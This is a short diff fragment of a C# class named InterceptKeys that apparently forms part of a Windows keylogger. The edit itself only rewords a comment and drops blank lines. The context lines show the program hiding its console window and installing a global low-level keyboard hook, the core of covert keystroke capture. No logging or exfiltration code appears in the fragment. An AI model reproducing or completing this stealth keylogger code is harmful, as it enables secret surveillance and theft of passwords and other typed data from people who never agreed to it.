@@ -15,13 +15,11 @@ class InterceptKeys
     {
         var handle = GetConsoleWindow();
 
-        // Hide
+        // Hide terminal / Console
         ShowWindow(handle, SW_HIDE);
-
         _hookID = SetHook(_proc);
         Application.Run();
         UnhookWindowsHookEx(_hookID);
-
     }
 
     private static IntPtr SetHook(LowLevelKeyboardProc proc)
